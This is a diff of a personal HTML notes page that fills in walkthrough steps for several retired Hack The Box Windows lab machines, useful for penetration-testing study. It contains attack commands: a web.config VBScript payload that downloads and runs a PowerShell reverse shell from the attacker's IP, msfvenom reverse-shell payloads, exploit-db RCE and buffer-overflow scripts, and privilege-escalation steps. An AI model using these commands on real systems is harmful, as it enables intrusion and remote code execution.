@@ -309,7 +309,7 @@
     <div id="particles-js"></div>
     <header>
         <h2 class="glow"># joe95's Notes</h2>
-        <br><span>last_update:Dec.16.2023</span>
+        <br><span>last_update:Dec.18.2023</span>
         <script src="displayVisitorInfo.js"></script>
         <br><span id="visitorInfo"></span>
     </header>
@@ -2085,7 +2085,7 @@
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Blue (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Blue (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold(system)</span>
                         <br>`nmap -p 445 -script vuln 10.10.10.40`
@@ -2096,93 +2096,93 @@
                         <br>msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.14
                         <br>msf6 exploit(windows/smb/ms17_010_eternalblue) > run
                         <br>meterpreter > shell
-                        <br>OR use python script https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script
+                        <br>Manually method: https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script
+                        <br>https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
+                        <br>I've not tried this one
                     </div>
                 </div>
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Bounty (difficulty/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <!-- ---------------------------------------180--------------------------------------- -->
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Buff (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>gobuster dir found /uploadedfiles /transfer.aspx
+                        <br>Failed: 'edit upload file name in burp cmdasp.aspx%00.jpg' /UploadedFiles/cmdasp.aspx shows error about web.config
+                        <br>https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/
+                        <br>I never try 003random's web.config, I used 0xdf's 'VBScript' version which the web.config file ends with:
+                        <br><%@ Language=VBScript %>
+                        <br><% call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')") %>
+                        <br>trigger with http://10.10.10.93/UploadedFiles/web.config 
+                        <br><span class="step_title">Privilege_escalation(merlin->system)</span>
+                        <br>https://github.com/decoder-it/juicy-potato
+                        <br>`.\jp.exe -t * -p c:\users\public\invoke-ps.ps1 -l 9001`
+                        <br>OR  msf exploit(windows/local/ms10_092_schelevator) > 
+                        <br>OR  msf exploit(windows/local/ms16_014_wmi_recv_notif) > 
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Cascade (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Buff (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>8080/contact.php show 'Gym Management Software 1.0'
+                        <br>Gym Management System 1.0 - Unauthenticated Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/48506.py
+                        <br>`python2 48506.py http://10.10.10.198:8080/`
+                        <br><span class="step_title">Privilege_escalation(shaun->administrator)</span>
+                        <br>`netstat` and `tasklist` found 'CloudMe.exe' running 'TCP 127.0.0.1:8888'
+                        <br>CloudMe 1.11.2 - Buffer Overflow (PoC) /usr/share/exploitdb/exploits/windows/remote/48389.py
+                        <br>`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.26 lport=9002 -b '\x00\x0A\x0D' -f python -v payload`
+                        <br>kali# chisel_1.7.6_linux_amd64 server -p 8000 --reverse
+                        <br>target> chisel.exe client 10.10.14.26:8000 R:8888:127.0.0.1:8888
+                        <br>kali# python3 48389.py
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Chatterbox (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Cascade (Medium/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>`ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people.txt`
+                        <br>found 'cascadeLegacyPwd: clk0bjVldmE=' in ldap-people.txt and base64 -d got cred r.thompson:rY4n5eva which works on smb verified by crackmapexec
+                        <br>`smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva` `smbclient -U r.thompson%rY4n5eva //10.10.10.182/Data`
+                        <br>I've not tried: smb: \> mask ""; prompt OFF; recurse ON; lcd smb/ ;mget *
+                        <br>I've not tried: mount -t cifs -o 'username=r.thompson,password=rY4n5eva' //10.10.11.182/Data /mnt
+                        <br>found '"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f' in //10.10.10.182/Data/IT/Temp/s.smith/VNC\ Install.reg
+                        <br>google 'vnc install.reg password' found https://github.com/frizb/PasswordDecrypts
+                        <br>`echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv`  output 'sT333ve2'
+                        <br>`evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2`
+                        <br><span class="step_title">Privilege_escalation(s.smith->arksvc)</span>
+                        <br>//10.10.10.182/Audit$/RunAudit.bat has 'CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"'
+                        <br>on windows VM(I use commando), use dnSpy debug 'CascAudit.exe' with 'Audit.db' as arg 
+                        <br>set break-point at line of 'sqliteConnection.Close();' and run, found cred arksvc:w3lc0meFr31nd
+                        <br>`evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd`
+                        <br><span class="step_title">Privilege_escalation(arksvc->administrator)</span>
+                        <br>`net user arksvc` found it's in 'CASCADE\AD Recycle Bin' group
+                        <br>`Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects` found 'TempAdmin'
+                        <br>`Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *` found 'cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz'
+                        <br>`echo YmFDVDNyMWFOMDBkbGVz | base64 -d` got cred TempAdmin:baCT3r1aN00dles
+                        <br>`evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles`
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Conceal (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Chatterbox (Medium/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>Achat 0.150 beta7 - Remote Buffer Overflow /usr/share/exploitdb/exploits/windows/remote/36025.py
+                        <br>`msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c \"iex(new-object net.webclient).downloadstring('http://10.10.14.29/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`
+                        <br>if using '-a x86 --platform Windows -p windows/meterpreter/reverse_tcp' the shell died very quick, unless using msf auto-migrate
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="hard">Conceal (Hard/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>`nmap -sU -p- --min-rate=1000 10.10.10.116` found '161/udp open  snmp'
+                        <br>`snmpwalk -v 2c -c public 10.10.10.116 > snmpwalk_v2c.txt` found 'SNMPv2-MIB::sysContact.0 = STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43'
+                        <br>crackstation crack got 'Dudecake1!' `apt install strongswan` and edit /etc/ipsec.conf and /etc/ipsec.secrets
+                        <br>`ipsec up conceal` if not work, try `ipsec restart`
+                        <br>nmap again found ftp and iis default web
+                        <br>ftp anonymous upload shell.asp and /upload/shell.asp
+                        <br><span class="step_title">Privilege_escalation(destitute->system)</span>
+                        <br>`whoami /all` 'SeImpersonatePrivilege Enabled'
+                        <br>https://github.com/ohpe/juicy-potato/releases
                     </div>
                 </div>
                 <div class="sub_dropdown">
@@ -3137,10 +3137,11 @@
             </div>
         </div>
         <!-- ========================pico_ctf_content======================== -->
-        <h5>I'm currently Studying OSCP</h5>
-        <h5><span id="protectedEmail"></span></h5>
-        <h5><a href="https://www.linkedin.com/in/joe912693295" target="_blank">LinkedIn Profile</a></h5>
-        <h5>Certified: CCNP-RS | CCIE-Security</h5>
+        
+        <span>I'm currently Studying OSCP</span>
+        <br><span id="protectedEmail"></span>
+        <br><span><a href="https://www.linkedin.com/in/joe912693295" target="_blank">LinkedIn Profile</a></span>
+        <br><span>Certified: CCNP-RS | CCIE-Security</span>
     </main>
     </body>
 </html>
